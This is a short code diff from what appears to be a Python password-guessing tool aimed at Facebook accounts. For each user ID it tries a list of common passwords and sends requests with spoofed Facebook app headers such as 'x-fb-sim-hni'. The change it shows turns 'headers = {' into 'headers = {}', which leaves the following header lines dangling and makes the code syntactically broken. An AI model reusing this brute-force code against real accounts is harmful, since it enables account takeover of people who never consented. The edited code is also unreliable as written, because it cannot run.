@@ -464,7 +464,7 @@ def login_2(uid):
     for pw in ('123456', '786786', 'Priya@123', 'Raj#1234', 'Pooja1234', 'Aman@1234', 'Akash@1234', 'Rajesh123', 'Khushi@123', '123123', '1234567', '12345678', '123456789'):
         try:
             with requests.Session() as session:
-                headers = {
+                headers = {}
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                     'x-fb-sim-hni': str(rr(20000, 40000)),
                     'x-fb-net-hni': str(rr(20000, 40000)),
